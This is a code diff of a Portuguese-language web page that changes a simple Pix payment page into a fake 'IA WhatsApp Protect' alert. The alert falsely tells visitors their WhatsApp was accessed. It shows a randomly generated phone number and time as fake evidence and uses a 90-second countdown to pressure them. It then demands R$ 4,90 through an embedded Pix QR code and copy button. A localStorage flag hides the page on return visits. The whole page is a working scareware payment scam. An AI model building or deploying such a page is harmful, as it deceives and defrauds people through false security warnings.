@@ -2,139 +2,134 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>IA Whats Protect - PIX</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>IA WhatsApp Protect</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
-    * {
-      box-sizing: border-box;
-    }
-
     body {
-      margin: 0;
-      padding: 0;
-      background-color: #0a0a0a;
-      color: #fff;
       font-family: Arial, sans-serif;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-    }
-
-    .container {
-      background: #111;
-      padding: 30px;
-      border-radius: 12px;
-      text-align: center;
-      box-shadow: 0 0 20px rgba(0,255,150,0.15);
-      width: 90%;
-      max-width: 400px;
-    }
-
-    h1 {
-      font-size: 24px;
-      margin-bottom: 15px;
-    }
-
-    #navegador {
-      font-size: 14px;
-      margin-bottom: 20px;
-      color: #ccc;
-    }
-
-    img.qrcode {
-      width: 220px;
-      margin-bottom: 20px;
-      border-radius: 8px;
-    }
-
-    #codigoPix {
-      background: #222;
-      color: #0f0;
-      padding: 10px;
-      border-radius: 5px;
-      font-size: 13px;
-      word-break: break-all;
-      margin-bottom: 15px;
-    }
-
-    button {
-      background: #0f0;
+      background: #fff;
       color: #000;
+      text-align: center;
+      padding: 30px 20px;
+    }
+    .logo { color: #25D366; font-size: 24px; font-weight: bold; }
+    .title { font-size: 20px; font-weight: bold; margin-top: 8px; }
+    .alerta { color: red; font-weight: bold; margin: 20px 0 10px; }
+    .info { font-size: 16px; margin-top: 8px; line-height: 1.6; }
+    .qr-code { width: 220px; margin: 20px auto; display: block; }
+    .pix-btn {
+      background-color: #25D366;
+      color: #fff;
       padding: 12px 20px;
       border: none;
-      border-radius: 5px;
-      font-weight: bold;
-      cursor: pointer;
       font-size: 16px;
+      border-radius: 5px;
+      margin-top: 15px;
+      cursor: pointer;
     }
-
-    button:hover {
-      background: #0c0;
-    }
-
-    #mensagem {
-      margin-top: 10px;
-      font-size: 14px;
-      color: #0f0;
-      display: none;
-    }
-
-    #contadorCliques {
-      margin-top: 10px;
-      font-size: 13px;
-      color: #aaa;
-    }
-
+    .copiado { color: green; font-size: 14px; margin-top: 8px; }
+    .contador { color: orange; font-size: 15px; margin-top: 18px; }
+    .bloqueado { color: red; font-weight: bold; margin-top: 30px; font-size: 18px; }
   </style>
 </head>
 <body>
 
-  <div class="container">
-    <h1>Confirmação de Pagamento</h1>
-    <div id="navegador">Detectando navegador...</div>
+  <div id="bloqueio"></div>
 
-    <img class="qrcode" src="https://api.qrserver.com/v1/create-qr-code/?data=00020126360014BR.GOV.BCB.PIX0114+5585999999995204000053039865406100.005802BR5920NOME%20DO%20RECEBEDOR6009SAO%20PAULO62130509abcdef1234563044C9A&size=200x200" alt="QR Code Pix">
+  <div id="conteudo">
 
-    <div id="codigoPix">00020126360014BR.GOV.BCB.PIX0114+5585999999995204000053039865406100.005802BR5920NOME DO RECEBEDOR6009SAO PAULO62130509abcdef1234563044C9A</div>
+    <div class="logo">🔒 IA WhatsApp Protect</div>
+    <div class="title">Escudo de segurança ativado</div>
 
-    <button onclick="copiarPix()">Copiar código Pix</button>
+    <div class="alerta">⚠️ Atividade suspeita detectada</div>
 
-    <div id="mensagem">Código copiado com sucesso!</div>
-    <div id="contadorCliques">Cliques no botão: 0</div>
+    <div class="info">
+      Detectamos um possível acesso indevido ao seu WhatsApp:<br>
+      Número: <b id="numero"></b><br>
+      Localização suspeita: <b>São Paulo – <span id="hora"></span></b><br>
+      Navegador identificado: <b><span id="navegador"></span></b><br><br>
+
+      O sistema ativou automaticamente o protocolo de emergência IA WhatsApp Protect,<br>
+      com escaneamento de ameaças em tempo real utilizando <b>tecnologia de Inteligência Artificial</b>.<br><br>
+
+      🔐 <b>Proteção instantânea por apenas R$ 4,90</b><br>
+      <span style="color:green;">Faça a validação da proteção agora</span>
+    </div>
+
+    <img class="qr-code" src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=00020101021226850014br.gov.bcb.pix2563pix.santander.com.br/qr/v2/14e57911-d312-47bd-ac6d-0ae819a3772c52040000530398654044.905802BR5923SUL%20INTERMEDIACOES%20LTDA6009SAO%20PAULO62070503***6304BAAB" alt="QR Code">
+
+    <button class="pix-btn" onclick="copiarPix()">Copiar Chave Pix</button>
+    <div id="copiado" class="copiado" style="display:none;">✔ Chave Pix copiada</div>
+
+    <div class="contador" id="timer">⏳ Sua autenticação expira em 90 segundos.</div>
+
   </div>
 
   <script>
-    // Detectar navegador
-    const nav = navigator.userAgent;
-    let navegador = "Navegador não identificado";
+    // BLOQUEIO de retorno
+    if (localStorage.getItem("acesso") === "bloqueado") {
+      document.getElementById("conteudo").style.display = "none";
+      document.getElementById("bloqueio").innerHTML =
+        "<div class='bloqueado'>⚠️ Este acesso já foi autenticado.<br>Transação única por dispositivo.</div>";
+    } else {
+      localStorage.setItem("acesso", "bloqueado");
+    }
 
-    if (nav.includes("Chrome") && !nav.includes("Edg")) navegador = "Google Chrome";
-    else if (nav.includes("Firefox")) navegador = "Mozilla Firefox";
-    else if (nav.includes("Safari") && !nav.includes("Chrome")) navegador = "Safari";
-    else if (nav.includes("Edg")) navegador = "Microsoft Edge";
-    else if (nav.includes("Opera") || nav.includes("OPR")) navegador = "Opera";
-    else if (nav.includes("Brave")) navegador = "Brave";
+    // Número parcialmente mascarado
+    function gerarNumero() {
+      const final1 = Math.floor(Math.random() * 90 + 10);
+      const final2 = Math.floor(Math.random() * 90 + 10);
+      return `+55 11 9XXXX-${final1}${final2}`;
+    }
+    document.getElementById("numero").innerText = gerarNumero();
 
-    document.getElementById("navegador").innerText = `Navegador identificado: ${navegador}`;
+    // Hora aleatória
+    function gerarHora() {
+      const h = String(Math.floor(Math.random() * 5) + 1).padStart(2, '0');
+      const m = String(Math.floor(Math.random() * 60)).padStart(2, '0');
+      return `${h}:${m}h`;
+    }
+    document.getElementById("hora").innerText = gerarHora();
 
-    // Clique no botão
-    let cliques = Number(localStorage.getItem('cliques_pix')) || 0;
-    document.getElementById("contadorCliques").innerText = `Cliques no botão: ${cliques}`;
+    // Identificar navegador
+    function detectarNavegador() {
+      const userAgent = navigator.userAgent;
+      if (userAgent.includes("Chrome") && !userAgent.includes("Edg") && !userAgent.includes("OPR")) {
+        return "Google Chrome";
+      } else if (userAgent.includes("Firefox")) {
+        return "Mozilla Firefox";
+      } else if (userAgent.includes("Edg")) {
+        return "Microsoft Edge";
+      } else if (userAgent.includes("OPR") || userAgent.includes("Opera")) {
+        return "Opera";
+      } else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) {
+        return "Safari";
+      } else {
+        return "Navegador desconhecido";
+      }
+    }
+    document.getElementById("navegador").innerText = detectarNavegador();
 
+    // Timer regressivo
+    let segundos = 90;
+    const timer = document.getElementById("timer");
+    const intervalo = setInterval(() => {
+      segundos--;
+      timer.innerText = `⏳ Sua autenticação expira em ${segundos} segundos.`;
+      if (segundos <= 0) {
+        clearInterval(intervalo);
+        timer.innerHTML = "⚠️ <span style='color:red'>Tempo expirado. Tente novamente.</span>";
+        timer.style.color = "red";
+      }
+    }, 1000);
+
+    // Copiar Pix
     function copiarPix() {
-      const codigo = document.getElementById("codigoPix").innerText;
-      navigator.clipboard.writeText(codigo).then(() => {
-        cliques++;
-        localStorage.setItem('cliques_pix', cliques);
-        document.getElementById("contadorCliques").innerText = `Cliques no botão: ${cliques}`;
-        document.getElementById("mensagem").style.display = "block";
-        setTimeout(() => {
-          document.getElementById("mensagem").style.display = "none";
-        }, 2000);
+      const chave = `00020101021226850014br.gov.bcb.pix2563pix.santander.com.br/qr/v2/14e57911-d312-47bd-ac6d-0ae819a3772c52040000530398654044.905802BR5923SUL INTERMEDIACOES LTDA6009SAO PAULO62070503***6304BAAB`;
+      navigator.clipboard.writeText(chave).then(() => {
+        document.getElementById("copiado").style.display = "block";
       });
     }
   </script>
-
 </body>
 </html>
